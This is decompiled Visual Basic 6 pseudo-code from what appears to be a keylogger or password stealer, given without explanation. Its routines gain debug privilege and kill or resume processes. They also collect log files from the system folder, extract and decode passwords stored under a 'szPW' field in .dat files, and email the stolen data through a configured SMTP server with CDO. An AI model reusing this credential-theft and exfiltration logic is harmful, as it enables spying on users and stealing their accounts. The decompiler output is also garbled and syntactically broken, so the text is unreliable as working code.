      If var_3C = 1 Then
        ecx = ecx - eax+00000014h
        var_48 = var_3C.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this
        If var_48 < 0 Then
          GoTo loc_004194D2
        End If
        var_eax = Err.Raise
        var_6C = Err.Raise
  loc_004194D2: 
        var_70 = var_48
        GoTo loc_004194E3
      End If
    End If
    var_eax = Err.Raise
    var_70 = Err.Raise
  loc_004194E3: 
    var_3C.GetTypeInfoCount 'Ignore this = var_3C.GetTypeInfoCount 'Ignore this + var_70
    var_eax = GdipGetImageEncoders(var_28, var_38, var_3C.GetTypeInfoCount)
    If var_40 Then
      If var_40 = 1 Then
        edx = edx - ecx+00000014h
        var_4C = var_3C.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this
        If var_4C < 0 Then
          GoTo loc_00419556
        End If
        var_eax = Err.Raise
        var_74 = Err.Raise
  loc_00419556: 
        var_78 = var_4C
        GoTo loc_00419567
      End If
    End If
    var_eax = Err.Raise
    var_78 = Err.Raise
  loc_00419567: 
    If var_3C Then
      If var_3C = 1 Then
        ecx = ecx - eax+00000014h
        var_48 = var_3C.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this
        If var_48 < 0 Then
          GoTo loc_004195AC
        End If
        var_eax = Err.Raise
        var_7C = Err.Raise
  loc_004195AC: 
        var_80 = var_48 * 76
        GoTo loc_004195C0
      End If
    End If
    var_eax = Err.Raise
    var_80 = Err.Raise
  loc_004195C0: 
    var_28 = var_28 * 76
    var_3C.GetTypeInfoCount 'Ignore this = var_3C.GetTypeInfoCount 'Ignore this + var_78
    var_3C.GetTypeInfoCount 'Ignore this = var_3C.GetTypeInfoCount 'Ignore this + var_80
    var_eax = CopyMemory(var_3C.GetTypeInfoCount, var_24, var_2C)
    var_28 = var_28 - 00000001h
    var_54 = var_28
    GoTo loc_00419635
  loc_00419626: 
    var_30 = var_30 + var_50
    var_30 = var_30+var_50
  loc_00419635: 
    If var_30 <= var_28 Then
      If var_3C Then
        If var_3C = 1 Then
          var_30 = var_30 - eax+00000014h
          var_48 = var_30
          If var_48 < 0 Then
            GoTo loc_00419694
          End If
          var_eax = Err.Raise
          var_84 = Err.Raise
  loc_00419694: 
          var_88 = var_48 * 76
          GoTo loc_004196AE
        End If
      End If
      var_eax = Err.Raise
      var_88 = Err.Raise
  loc_004196AE: 
      var_eax = Proc_2_8_419820(eax+ecx+00000030h, var_24, var_40)
      var_44 = Proc_2_8_419820(eax+ecx+00000030h, var_24, var_40)
      eax = StrComp(var_44, arg_8, 1) + 1
      var_4C = StrComp(var_44, arg_8, 1) + 1
      If var_4C Then
        If var_24 Then
          If var_24 = 1 Then
            var_30 = var_30 - eax+00000014h
            var_48 = var_30
            If var_48 < 0 Then
              GoTo loc_00419751
            End If
            var_eax = Err.Raise
            var_8C = Err.Raise
  loc_00419751: 
            var_90 = var_48 * 76
            GoTo loc_0041976B
          End If
        End If
        var_eax = Err.Raise
        var_90 = Err.Raise
  loc_0041976B: 
        var_24(4) = var_24(4) + var_90
        call __vbaCopyBytes(00000010h, arg_C, var_24(4)+var_90, var_3C, var_3C, var_3C, edi, esi, ebx)
        GoTo loc_0041979F
      End If
      GoTo loc_00419626
  loc_0041979F: 
  loc_0041979F: 
  End If
  GoTo loc_004197EA
  Exit Sub
  loc_004197EA: 
  Exit Sub
End Sub

Public Sub Proc_2_8_419820
  On Error Resume Next
  var_eax = lstrlenW(arg_8, FFFFFFFFh, edi)
  var_58 = lstrlenW(arg_8, FFFFFFFFh, edi)
  var_24 = String$(var_58 * 2, &H4099EC)
  var_eax = WideCharToMultiByte(0, 0, arg_8, -1, var_24, Len(var_24), CStr(0), 0)
  var_ret_3 = var_2C
  var_eax = lstrlenW(VarPtr(var_24), 0)
  var_28 = Left$(var_24, lstrlenW(VarPtr(var_24), 0))
  GoTo loc_004199C6
  If 0 And 4 Then
  End If
  Exit Sub
  loc_004199C6: 
  Exit Sub
End Sub

Public Sub Proc_2_9_4199F0
  On Error Resume Next
  var_eax = GdiplusStartup(var_28, 1, 00000000h, FFFFFFFFh)
  var_24 = var_28
End Sub

Public Sub Proc_2_10_419A90
  On Error Resume Next
  var_eax = GdiplusShutdown(arg_8, FFFFFFFFh, edi)
End Sub

Public Sub Proc_2_11_419B10
  On Error Resume Next
  var_eax = GetWindowTextLengthA(arg_8, FFFFFFFFh, edi)
  var_24 = Space$(GetWindowTextLengthA(arg_8, FFFFFFFFh, edi))
  var_eax = GetWindowTextLengthA(arg_8, 0)
  var_eax = GetWindowText(arg_8, var_24, GetWindowTextLengthA(arg_8, 0)(1))
  var_ret_2 = var_2C
  var_28 = Trim$(var_24)
  GoTo loc_00419C33
  If 0 And 4 Then
  End If
  Exit Sub
  loc_00419C33: 
  Exit Sub
End Sub

Public Sub Proc_2_12_419C60
  On Error Resume Next
  var_eax = GetWindowThreadProcessId(arg_8, var_254, FFFFFFFFh)
  var_eax = CreateToolhelp32Snapshot(00000002h, 00000000h, edi)
  var_250 = CreateToolhelp32Snapshot(00000002h, 00000000h, edi)
  var_eax = Process32First(var_250, var_24C, global_00405598, var_394)
  var_26C = Process32First(var_250, var_24C, global_00405598, var_394)
  loc_00419D71: 
  If var_25C Then
    If var_254 = 0 Then
      call __vbaStrFixstr(00000104h, var_228, 00000001h, global_00405598, var_24C, var_394, var_24C, esi, ebx)
      var_260 = __vbaStrFixstr(00000104h, var_228, 00000001h, global_00405598, var_24C, var_394, var_24C, esi, ebx)
      InStr(, var_260, global_004099EC, 0) = InStr(, var_260, global_004099EC, 0) - 00000001h
      call __vbaStrFixstr(00000104h, var_228, InStr(, var_260, global_004099EC, 0))
      var_264 = __vbaStrFixstr(00000104h, var_228, InStr(, var_260, global_004099EC, 0))
      call __vbaLsetFixstr(00000104h, var_228, var_264)
      var_258 = Left$(var_264, )
      var_eax = CloseHandle(var_250)
      GoTo loc_00419F13
    End If
    var_eax = Process32Next(var_250, GetLastError, global_00405598)
    var_26C = Process32Next(var_250, GetLastError, global_00405598)
    GoTo loc_00419D71
  End If
  var_eax = CloseHandle(var_250)
  loc_00419F13: 
  GoTo loc_00419F51
  If 0 And 4 Then
  End If
  Exit Sub
  loc_00419F51: 
End Sub

Public Sub Proc_2_13_419F80
  var_18 = Replace(arg_8, "\??\", global_00408114, 1, -1, 0)
  var_18 = Replace(var_18, "\\?\", global_00408114, 1, -1, 0)
  var_18 = Replace(var_18, "\SystemRoot\", global_0042C130, 1, -1, 1)
  var_18 = Replace(var_18, "%systemroot%", global_0042C130, 1, -1, 1)
  var_18 = Replace(var_18, "\\", global_00406544, 1, -1, 0)
  var_14 = var_18
  GoTo loc_0041A06D
  Exit Sub
  loc_0041A06D: 
End Sub

Public Sub Proc_2_14_41A090
  On Error Resume Next
  If ecx = 0 Then
    var_eax = OpenThread(001F03FFh, 00000000h, FFFFFFFFh.GetTypeInfoCount)
    var_28 = OpenThread(001F03FFh, 00000000h, FFFFFFFFh.GetTypeInfoCount)
    If var_28 Then
      var_eax = ResumeThread(var_28)
      var_eax = CloseHandle(var_28)
    End If
    GoTo loc_0041A295
  End If
  var_eax = CreateToolhelp32Snapshot(00000004h, 00000000h)
  var_24 = CreateToolhelp32Snapshot(00000004h, 00000000h)
  0042C050h = 0042C050h + 00000004h
  var_eax = Thread32First(var_24, 0042C050h+00000004h)
  var_30 = Thread32First(var_24, 0042C050h+00000004h)
  var_2C = var_30
  loc_0041A1C0: 
  If var_2C Then
    If edx = 0 Then
      var_eax = OpenThread(001F03FFh, 00000000h)
      var_28 = OpenThread(001F03FFh, 00000000h)
      If var_28 Then
        var_eax = ResumeThread(var_28)
        var_eax = CloseHandle(var_28)
      End If
      GoTo loc_0041A27F
    End If
    0042C050h = 0042C050h + 00000004h
    var_eax = Thread32Next(var_24, 0042C050h+00000004h)
    var_30 = Thread32Next(var_24, 0042C050h+00000004h)
    var_2C = var_30
    GoTo loc_0041A1C0
  loc_0041A27F: 
  loc_0041A27F: 
  var_eax = CloseHandle(var_24)
  loc_0041A295: 
End Sub

Public Sub Proc_2_15_41A2B0
  On Error Resume Next
  var_eax = GetCurrentProcess(FFFFFFFFh, edi)
  var_6C = GetCurrentProcess(FFFFFFFFh, edi)
  var_eax = OpenProcessToken(var_6C, 40, var_64)
  var_70 = OpenProcessToken(var_6C, 40, var_64)
  If edx Then
    If ecx Then
  loc_0041A354: 
      var_eax = AdjustTokenPrivileges(var_64, 0, var_60, 28, var_3C, &H1C)
      GoTo loc_0041A465
    End If
    var_ret_1 = "SeDebugPrivilege"
    var_eax = LookupPrivilegeValue(0, var_ret_1, var_44)
    var_6C = LookupPrivilegeValue(0, var_ret_1, var_44)
    If var_74 Then
      If var_74 < 2 Then
        GoTo loc_0041A40F
      End If
      var_eax = Err.Raise
      var_8C = Err.Raise
  loc_0041A40F: 
      var_74 = var_74 * 12
      call __vbaCopyBytes(00000008h, arg_0, var_44, esi, ebx)
      If var_74 < 2 Then
        GoTo loc_0041A452
      End If
      var_eax = Err.Raise
      var_90 = Err.Raise
  loc_0041A452: 
      var_74 = var_74 * 12
      arg_0 = 2
      GoTo loc_0041A354
  loc_0041A465: 
  loc_0041A465: 
  loc_0041A465: 
  var_eax = CloseHandle(var_64)
  GoTo loc_0041A48C
  Exit Sub
  loc_0041A48C: 
End Sub

Public Sub Proc_2_16_41A4A0
  On Error Resume Next
  var_eax = Proc_2_15_41A2B0(-1, edi, esi)
  var_eax = OpenProcess(001F0FFFh, 00000000h)
  var_28 = OpenProcess(001F0FFFh, 00000000h)
  var_eax = GetExitCodeProcess(var_28, var_24)
  var_eax = TerminateProcess(var_28, var_24)
  var_2C = TerminateProcess(var_28, var_24)
  var_eax = CloseHandle(var_28)
End Sub

Public Sub Proc_2_17_41A5A0
  var_284 = arg_8
  Dim var_48(199) As Long
  On Error Resume Next
  var_eax = CreateToolhelp32Snapshot(0000000Fh, 00000000h, FFFFFFFFh, var_48, 00408078h)
  var_28 = CreateToolhelp32Snapshot(0000000Fh, 00000000h, FFFFFFFFh, var_48, 00408078h)
  var_eax = Process32First(var_28, var_3C0, global_00405598, var_3C0, var_280)
  var_2C = Process32First(var_28, var_3C0, global_00405598, var_3C0, var_280)
  var_24 = Space$(260)
  loc_0041A6CD: 
  If var_2C Then
    var_eax = OpenProcess(00000410h, 00000000h, var_278, global_00405598, var_280)
    var_288 = OpenProcess(00000410h, 00000000h, var_278, global_00405598, var_280)
    00000001h = 00000001h - 00000001h
    If var_298 < 200 Then
      GoTo loc_0041A749
    End If
    var_eax = Err.Raise
    var_500 = Err.Raise
  loc_0041A749: 
    var_ret_1 = var_24
    var_eax = SetWindowsHookEx(var_288, var_3C(var_298*4), var_ret_1, var_50)
    var_ret_2 = var_28C
    var_28C = Left$(var_24, SetWindowsHookEx(var_288, var_3C(var_298*4), var_ret_1, var_50))
    var_eax = Proc_2_13_419F80(var_28C, var_3C0, 3)
    var_54 = Proc_2_13_419F80(var_28C, var_3C0, 3)
    If Len(var_54) > 0 Then
      var_290 = global_00407CCC & var_54 & global_00407CCC
      If var_298 Then
        var_eax = Proc_2_16_41A4A0(var_278, 0, esi)
      End If
    End If
    var_eax = Process32Next(var_28, var_280, global_00405598)
    var_2C = Process32Next(var_28, var_280, global_00405598)
    GoTo loc_0041A6CD
  End If
  var_eax = CloseHandle(var_28)
  GoTo loc_0041A934
  Exit Sub
  loc_0041A934: 
  var_294 = var_48
End Sub

Public Sub Proc_2_18_41A980
  var_28C = arg_8
  Dim var_50(199) As Long
  On Error Resume Next
  var_eax = CreateToolhelp32Snapshot(0000000Fh, 00000000h, FFFFFFFFh, var_50, 00408078h)
  var_2C = CreateToolhelp32Snapshot(0000000Fh, 00000000h, FFFFFFFFh, var_50, 00408078h)
  var_eax = Process32First(var_2C, var_3C8, global_00405598, var_3C8, var_288)
  var_30 = Process32First(var_2C, var_3C8, global_00405598, var_3C8, var_288)
  var_28 = Space$(260)
  loc_0041AAAD: 
  If var_30 Then
    var_eax = OpenProcess(00000410h, 00000000h, var_280, global_00405598, var_288)
    var_290 = OpenProcess(00000410h, 00000000h, var_280, global_00405598, var_288)
    00000001h = 00000001h - 00000001h
    If var_2A0 < 200 Then
      GoTo loc_0041AB29
    End If
    var_eax = Err.Raise
    var_508 = Err.Raise
  loc_0041AB29: 
    var_ret_1 = var_28
    var_eax = SetWindowsHookEx(var_290, var_44(var_2A0*4), var_ret_1, var_58)
    var_ret_2 = var_294
    var_294 = Left$(var_28, SetWindowsHookEx(var_290, var_44(var_2A0*4), var_ret_1, var_58))
    var_eax = Proc_2_13_419F80(var_294, var_3C8, 3)
    var_294 = LCase$(Proc_2_13_419F80(var_294, var_3C8, 3))
    var_298 = LCase$(var_28C)
    eax = (var_294 = var_298) + 1
    var_2A0 = (var_294 = var_298) + 1
    If var_2A0 Then
      var_24 = var_24 + 0001h
      var_24 = 0.QueryInterface 'Ignore this
    End If
    var_eax = Process32Next(var_2C, var_288, global_00405598, var_4F0)
    var_30 = Process32Next(var_2C, var_288, global_00405598, var_4F0)
    GoTo loc_0041AAAD
  End If
  var_eax = CloseHandle(var_2C)
  var_38 = var_24
  GoTo loc_0041AD00
  Exit Sub
  loc_0041AD00: 
  var_29C = var_50
End Sub

Public Sub Proc_2_19_41AD60
  var_1C = arg_8
  var_20 = Chr$(0)
  If var_20 Then
    var_20 = Chr$(0)
    InStr(1, var_1C, var_20, 0) = InStr(1, var_1C, var_20, 0) - 00000001h
    var_1C = Left$(var_1C, InStr(1, var_1C, var_20, 0))
  End If
  var_18 = var_1C
  GoTo loc_0041AE43
  If var_4 Then
  End If
  Exit Sub
  loc_0041AE43: 
End Sub

Public Sub Proc_2_20_41AE70
  Dim var_29C As Me
  On Error Resume Next
  var_40 = FileLen(global_0042C0E8)
  ReDim var_28(0 To var_34)
  If var_28 Then
    If var_28 = 1 Then
      var_34 = var_34 - edx+00000014h
      var_33C = var_34
      If var_33C < 0 Then
        GoTo loc_0041AF4C
      End If
      var_eax = Err.Raise
      var_5E4 = Err.Raise
  loc_0041AF4C: 
      var_5E8 = var_33C
      GoTo loc_0041AF69
    End If
  End If
  var_eax = Err.Raise
  var_5E8 = Err.Raise
  loc_0041AF69: 
  var_28(4) = var_28(4) + var_5E8
  ecx = 0042C0E8h
  var_ret_1 = global_0042C130 & "system\" & "*." & global_0042C14C
  var_eax = FindFirstFileA(var_ret_1, var_28, " ?", var_47C, var_290)
  var_30 = FindFirstFileA(var_ret_1, var_28, " ?", var_47C, var_290)
  If var_30 <> -1 Then
  loc_0041B071: 
    call __vbaStrFixstr(00000104h, var_264, " ?", var_290, var_47C, FFFFFFFFh, edi, esi, ebx)
    var_2A0 = __vbaStrFixstr(00000104h, var_264, " ?", var_290, var_47C, FFFFFFFFh, edi, esi, ebx)
    var_eax = Proc_2_19_41AD60(var_2A0)
    call __vbaLsetFixstr(00000104h, var_264, var_2A0)
    var_2C = Proc_2_19_41AD60(var_2A0)
    var_338 = InStrRev(var_2C, global_00406BFC, -1, 0)
    var_298 = LCase$(Mid$(var_2C, FindFirstFileA(var_ret_1, var_28, " ?", var_47C, var_290)(1), 10))
    If (var_298 = global_0042C14C) = 0 Then
      var_2A4 = global_0042C130 & "system\" & var_2C
      var_40 = var_40 + FileLen(var_2A4)
      var_40 = var_40+FileLen(var_2A4)
      var_34 = var_34 + 0001h
      var_34 = .QueryInterface 'Ignore this
      ReDim Preserve var_28(0 To .QueryInterface 'Ignore this)
      If var_28 Then
        If var_28 = 1 Then
          var_34 = var_34 - eax+00000014h
          var_33C = var_34
          If var_33C < 0 Then
            GoTo loc_0041B2A2
          End If
          var_eax = Err.Raise
          var_5EC = Err.Raise
  loc_0041B2A2: 
          var_5F0 = var_33C
          GoTo loc_0041B2BF
        End If
      End If
      var_eax = Err.Raise
      var_5F0 = Err.Raise
  loc_0041B2BF: 
      var_28(4) = var_28(4) + var_5F0
      ecx = global_0042C130 & "system\" & var_2C
    End If
    var_eax = FindNextFileA(var_30, var_290, " ?")
    var_338 = FindNextFileA(var_30, var_290, " ?")
    If var_338 <> 0 Then GoTo loc_0041B071
    If global_42C12C = -1 Then
      var_eax = GetForegroundWindow(" ?", var_290, var_5BC)
    End If
    var_eax = FindClose(var_30, var_5BC)
  End If
  If var_40 > 81920 Then
    If 0042C038h > var_42C040 Then
      var_eax = Proc_1_0_411210(global_0042C048, var_290)
      var_eax = Proc_1_8_415980(global_0042C0E8, Proc_1_0_411210(global_0042C048, var_290))
      var_2AC = global_004096D4 & global_0042C02C & global_004096D4 & global_0042C030 & global_004096D4
      global_42C040 = Len(1 & Format$(Now, "d/m/yy h:m") & global_004096D4 & "vbCrLf")
      global_42C034 = global_0042C040
      global_42C038 = global_0042C034
    End If
    If Len(global_0042C170) > 0 Then
      var_eax = Proc_2_21_41BC10(global_0042C170, 1, var_2AC)
      var_38 = Proc_2_21_41BC10(global_0042C170, 1, var_2AC)
      If Len(var_38) > 0 Then
        var_2A0 = "vbCrLf" & "§§§§§§§"
        var_2A4 = var_2A0 & var_38
        var_eax = Proc_1_0_411210(var_2A4)
        var_eax = Proc_1_8_415980(global_0042C0E8, Proc_1_0_411210(var_2A4))
      End If
    End If
    var_eax = = Date$
    var_338 = Timer
    var_5E0 = var_2A0
    var_2CC = var_5E0
    var_2EC = var_338
    var_2AC = global_0042C130 & "system\" & global_00409878 & global_0042C168 & global_004095DC
    var_2B4 = 1 & Format$(var_5E0, "yymmdd")
    var_3C = 1 & Format$(var_338, "00000") & global_00406BFC & global_0042C148
    var_eax = Proc_1_9_415AF0(var_3C, 1, var_2B4)
    var_eax = Proc_3_6_41F830(var_28, var_3C, 1)
    If Proc_3_6_41F830(var_28, var_3C, 1) Then
      SetAttr var_3C, 39
      var_5C4 = var_34
      GoTo loc_0041B969
  loc_0041B954: 
      var_24 = var_24 + var_5C0
      var_24 = var_24+var_5C0
  loc_0041B969: 
      If var_24 <= var_34 Then
        If var_29C Then
          If var_29C = 1 Then
            var_24 = var_24 - ecx+00000014h
            var_33C = var_24
            If var_33C < 0 Then
              GoTo loc_0041B9E3
            End If
            var_eax = Err.Raise
            var_5F4 = Err.Raise
  loc_0041B9E3: 
            var_5F8 = var_33C
            GoTo loc_0041BA00
          End If
        End If
        var_eax = Err.Raise
        var_5F8 = Err.Raise
  loc_0041BA00: 
        var_29C.GetTypeInfoCount 'Ignore this = var_29C.GetTypeInfoCount 'Ignore this + var_5F8
        var_eax = Proc_1_9_415AF0(var_29C.GetTypeInfoCount, var_28, var_2AC)
        GoTo loc_0041B954
      End If
    End If
  End If
  GoTo loc_0041BACF
  Exit Sub
  loc_0041BACF: 
End Sub

Public Sub Proc_2_21_41BC10
  Dim var_2C As Me
  var_2C = arg_8
  On Error Resume Next
  var_2C = Left$(var_2C, InStrRev(var_2C, global_00406544, -1, 0))
  var_eax = Proc_1_1_4115D0(var_2A8, -1, edi)
  var_2B0 = Proc_1_1_4115D0(var_2A8, -1, edi)
  var_2D0 = Split(var_2B0, &H406F58, -1, 0)
  var_44 = var_2D0
  call UBound(00000001h, var_44, 0, ebx)
  var_570 = UBound(00000001h, var_44, 0, ebx)
  GoTo loc_0041BDD9
  loc_0041BDC7: 
  var_24 = var_24 + var_56C
  var_24 = var_24+var_56C
  loc_0041BDD9: 
  If var_24 <= UBound(00000001h, var_44, 0, ebx) Then
    If var_44 Then
      If var_44 = 1 Then
        var_24 = var_24 - eax+00000014h
        var_2E8 = var_24
        If var_2E8 < 0 Then
          GoTo loc_0041BE33
        End If
        var_eax = Err.Raise
        var_598 = Err.Raise
  loc_0041BE33: 
        var_59C = var_2E8
        GoTo loc_0041BE50
      End If
    End If
    var_eax = Err.Raise
    var_59C = Err.Raise
  loc_0041BE50: 
    var_2A8 =  & ecx+edx
    var_48 = var_2A8 & global_00406544
    var_ret_1 = var_48 & "*.dat"
    var_eax = FindFirstFileA(var_ret_1, var_48, " ?")
    var_38 = FindFirstFileA(var_ret_1, var_48, " ?")
    If var_38 <> -1 Then
  loc_0041BF45: 
      call __vbaStrFixstr(00000104h, var_278, " ?", var_2A4, var_428, var_428, var_2A4)
      var_2A8 = __vbaStrFixstr(00000104h, var_278, " ?", var_2A4, var_428, var_428, var_2A4)
      var_eax = Proc_2_19_41AD60(var_2A8)
      call __vbaLsetFixstr(00000104h, var_278, var_2A8)
      var_34 = Proc_2_19_41AD60(var_2A8)
      var_2A8 = var_48 & var_34
      If var_2E8 Then
        var_2A8 = var_48 & var_34
        var_eax = Proc_1_7_415830(var_2A8)
        var_40 = Proc_1_7_415830(var_2A8)
        var_28 = InStr(1, var_40, "[""szPW""]", 0)
        If var_28 > 0 Then
          var_50 = InStr(var_28(3), var_40, global_004095E4, 0)
          If var_50 > 0 Then
            var_54 = InStr(var_50(1), var_40, global_004095E4, 0)
            If var_54 = 0 Then
              var_4C = Mid$(var_40, var_50(1), 6)
              var_3C = var_3C & "vbCrLf" & var_34 & global_004086A8
              GoTo loc_0041C206
  loc_0041C1F4: 
              var_28 = var_28 + var_574
              var_28 = var_28+var_574
  loc_0041C206: 
              If var_28 <= 6 Then
                var_2A8 = Mid$(var_4C, var_28, 1)
                InStr(1, "59ABCQEF01", var_2A8, 0) = InStr(1, "59ABCQEF01", var_2A8, 0) - 00000001h
                var_3C = var_3C & CStr(InStr(1, "59ABCQEF01", var_2A8, 0))
                GoTo loc_0041C1F4
              End If
            End If
          End If
        End If
      End If
      var_eax = FindNextFileA(var_38, var_2A4, " ?")
      var_2E4 = FindNextFileA(var_38, var_2A4, " ?")
      If var_2E4 <> 0 Then GoTo loc_0041BF45
      var_eax = FindClose(var_38, " ?", var_2A4)
    End If
    GoTo loc_0041BDC7
  End If
  var_30 = var_3C
  GoTo loc_0041C3AD
  If 0 And 4 Then
  End If
  Exit Sub
  loc_0041C3AD: 
End Sub

Public Sub Proc_2_22_41C410
  On Error Resume Next
  Set var_54 = CreateObject("CDO.Message", 0)
  Set var_3C = Me.BodyPart
  var_B0 = "text/plain"
  var_3C
  var_B0 = "base64"
  var_3C
  var_B0 = "utf-8"
  var_3C
  Set var_2C = Me.AddBodyPart
  var_B0 = "text/plain"
  var_2C
  var_B0 = "base64"
  var_2C
  var_98 = Split(global_0042C080, &H407CCC, -1, 0)
  var_44 = var_98
  call UBound(00000001h, var_44, "ContentTransferEncoding", 00000008h, var_B4, "base64", var_AC, "ContentMediaType", 00000008h, var_B4, "text/plain", var_AC, "utf-8")
  If 0042C1A4h > 0 Then
  End If
  If var_44 Then
    If var_44 = 1 Then
      0042C1A4h = 0042C1A4h - edx+00000014h
      var_E0 = global_0042C1A4
      If 0042C1A4h >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041C71E
    End If
  End If
  var_eax = Err.Raise
  loc_0041C71E: 
  var_B0 = ecx+eax
  var_54
  var_98 = Split(global_0042C07C, &H407CCC, -1, 0)
  var_44 = var_98
  Randomize(10)
  call UBound(00000001h, var_44, "To", 00000008h, var_B4, ecx+eax, var_AC)
  var_F4 = UBound(00000001h, var_44, "To", 00000008h, var_B4, ecx+eax, var_AC)
  var_58 = CInt((Rnd(10) * var_F4))
  If var_44 Then
    If var_44 = 1 Then
      var_58 = var_58 - ecx+00000014h
      var_E0 = var_58
      If var_58 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041C8AD
    End If
  End If
  var_eax = Err.Raise
  loc_0041C8AD: 
  var_B0 = ecx+eax
  var_54
  var_74 = global_00409D74 & CStr(global_0042C12C) & global_00409878 & global_0042C168 & global_00406544 & global_0042C16C & global_004095DC
  var_A0 = 1 & Format$(Now, "dd/mm/yy hh:mm")
  var_54
  var_54 = Me.AddAttachment
  var_90 = "http://schemas.microsoft.com/cdo/configuration/" & "sendusing"
  Set var_88 = var_54."Configuration"
  Set 1 & var_78 = var_88.1
  call __vbaVarLateMemCallSt(var_88, 00000008h, var_94, "http://schemas.microsoft.com/cdo/configuration/" & "sendusing", var_8C)
  var_98 = Split(global_0042C084, &H407CCC, -1, 0)
  var_44 = var_98
  var_90 = "http://schemas.microsoft.com/cdo/configuration/" & "smtpserver"
  If var_44 Then
    If var_44 = 1 Then
      var_58 = var_58 - ecx+00000014h
      var_E0 = var_58
      If var_58 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041CC14
    End If
  End If
  var_eax = Err.Raise
  loc_0041CC14: 
  Set 1 & var_78 = var_54."Configuration".1
  call __vbaVarLateMemCallSt(var_A8, var_98, var_94, var_90, var_8C)
  var_98 = Split(global_0042C088, &H407CCC, -1, 0)
  var_44 = var_98
  var_90 = "http://schemas.microsoft.com/cdo/configuration/" & "smtpserverport"
  If var_44 Then
    If var_44 = 1 Then
      var_58 = var_58 - ecx+00000014h
      var_E0 = var_58
      If var_58 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041CD9E
    End If
  End If
  var_eax = Err.Raise
  loc_0041CD9E: 
  Set 1 & var_78 = var_54."Configuration".1
  call __vbaVarLateMemCallSt(var_A8, var_98, var_94, var_90, var_8C)
  var_90 = "http://schemas.microsoft.com/cdo/configuration/" & "smtpconnectiontimeout"
  Set 1 & var_78 = var_54."Configuration".1
  call __vbaVarLateMemCallSt(var_A8, 00000008h, var_94, "http://schemas.microsoft.com/cdo/configuration/" & "smtpconnectiontimeout", var_8C)
  var_98 = Split(global_0042C08C, &H407CCC, -1, 0)
  var_44 = var_98
  var_90 = "http://schemas.microsoft.com/cdo/configuration/" & "smtpusessl"
  If var_44 Then
    If var_44 = 1 Then
      var_58 = var_58 - ecx+00000014h
      var_E0 = var_58
      If var_58 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041CFDC
    End If
  End If
  var_eax = Err.Raise
  loc_0041CFDC: 
  Set 1 & var_78 = var_54."Configuration".1
  call __vbaVarLateMemCallSt(var_A8, var_98, var_94, var_90, var_8C)
  var_98 = Split(global_0042C090, &H407CCC, -1, 0)
  var_44 = var_98
  var_90 = "http://schemas.microsoft.com/cdo/configuration/" & "smtpauthenticate"
  If var_44 Then
    If var_44 = 1 Then
      var_58 = var_58 - ecx+00000014h
      var_E0 = var_58
      If var_58 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041D166
    End If
  End If
  var_eax = Err.Raise
  loc_0041D166: 
  Set 1 & var_78 = var_54."Configuration".1
  call __vbaVarLateMemCallSt(var_A8, var_98, var_94, var_90, var_8C)
  var_98 = Split(global_0042C094, &H407CCC, -1, 0)
  var_44 = var_98
  var_90 = "http://schemas.microsoft.com/cdo/configuration/" & "sendusername"
  If var_44 Then
    If var_44 = 1 Then
      var_58 = var_58 - ecx+00000014h
      var_E0 = var_58
      If var_58 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041D2F0
    End If
  End If
  var_eax = Err.Raise
  loc_0041D2F0: 
  Set 1 & var_78 = var_54."Configuration".1
  call __vbaVarLateMemCallSt(var_A8, var_98, var_94, var_90, var_8C)
  var_98 = Split(global_0042C098, &H407CCC, -1, 0)
  var_44 = var_98
  var_90 = "http://schemas.microsoft.com/cdo/configuration/" & "sendpassword"
  If var_44 Then
    If var_44 = 1 Then
      var_58 = var_58 - ecx+00000014h
      If var_58 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041D472
    End If
  End If
  var_eax = Err.Raise
  loc_0041D472: 
  Set 1 & var_78 = var_54."Configuration".1
  call __vbaVarLateMemCallSt(var_A8, var_98, var_94, var_90, var_8C)
  Set 1 & var_78 = var_54."Configuration".0
  1 & var_78 = Me.
  var_54 = Me.send
  call __vbaVarSetObjAddref(var_54, 00000000h)
  call __vbaVarSetObjAddref(var_3C, 00000000h)
  call __vbaVarSetObjAddref(var_2C, 00000000h)
  Exit Sub
  GoTo loc_0041D642
  0042C1A4h = 0042C1A4h + 0001h
  call __vbaVarSetObjAddref(var_54, 00000000h)
  call __vbaVarSetObjAddref(var_3C, 00000000h)
  call __vbaVarSetObjAddref(var_2C, 00000000h)
  Exit Sub
  GoTo loc_0041D642
  Exit Sub
  loc_0041D642: 
  Exit Sub
End Sub

Public Sub Proc_2_23_41D690
  On Error Resume Next
  Set var_40 = CreateObject("CDO.Message", 0)
  Set var_2C = Me.BodyPart
  var_A0 = "text/plain"
  var_2C
  var_A0 = "base64"
  var_2C
  var_A0 = "utf-8"
  var_2C
  var_40
  var_88 = Split(global_0042C07C, &H407CCC, -1, 0)
  var_30 = var_88
  Randomize(10)
  call UBound(00000001h, var_30, "To", 00000008h, var_A4, arg_8, var_9C, "Charset", 00000008h, var_A4, "utf-8", var_9C, "ContentTransferEncoding")
  var_E4 = UBound(00000001h, var_30, "To", 00000008h, var_A4, arg_8, var_9C, "Charset", 00000008h, var_A4, "utf-8", var_9C, "ContentTransferEncoding")
  var_44 = CInt((Rnd(10) * var_E4))
  If arg_10 Then
    GoTo loc_0041D994
  End If
  If var_30 Then
    If var_30 = 1 Then
      var_44 = var_44 - ecx+00000014h
      If var_44 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041D98E
    End If
  End If
  var_eax = Err.Raise
  loc_0041D98E: 
  loc_0041D994: 
  var_A0 = edx+eax
  var_40
  var_64 = global_00409D74 & CStr(global_0042C12C) & global_00409878 & global_0042C168 & global_00406544 & global_0042C16C & global_004095DC
  var_90 = 1 & Format$(Now, "dd/mm/yy hh:mm")
  var_40
  var_A0 = arg_C
  var_40
  var_80 = "http://schemas.microsoft.com/cdo/configuration/" & "sendusing"
  Set var_78 = var_40."Configuration"
  Set 1 & var_68 = var_78.1
  call __vbaVarLateMemCallSt(var_78, 00000008h, var_84, "http://schemas.microsoft.com/cdo/configuration/" & "sendusing", var_7C)
  var_88 = Split(global_0042C084, &H407CCC, -1, 0)
  var_30 = var_88
